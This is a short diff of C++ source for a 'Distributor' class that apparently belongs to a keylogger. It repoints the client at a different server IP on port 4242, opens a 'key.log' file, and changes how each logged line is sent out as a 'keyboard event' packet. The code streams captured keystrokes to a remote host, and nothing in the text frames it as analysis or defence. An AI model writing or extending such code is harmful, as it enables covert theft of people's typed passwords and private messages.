@@ -10,7 +10,8 @@ Distributor::~Distributor()
 
 void Distributor::init(void)
 {
-	_client.connect("192.168.1.21", "4242");
+	_client.connect("192.168.1.23", "4242");
+	//_client.connect("10.101.54.75", "4242");
 	_client.run();
 
 	_log.open(StaticTools::GetProjectResourceDirectory() + "\\key.log");
@@ -50,13 +51,7 @@ void Distributor::sendToSend(void)
 
 	if (ifs) {
 		while (std::getline(ifs, line)) {
-			JSONBuilder builder;
-
-			builder.addValue("type", "cmd");
-			builder.addValue("name", "key");
-			builder.addValue("param", line + "\n");
-
-			_client << builder.get();
+			_client << StaticTools::CreatePacket(PacketType::PT_KeyboardEvent, line + '\n');
 		}
 		ifs.close();
 	}
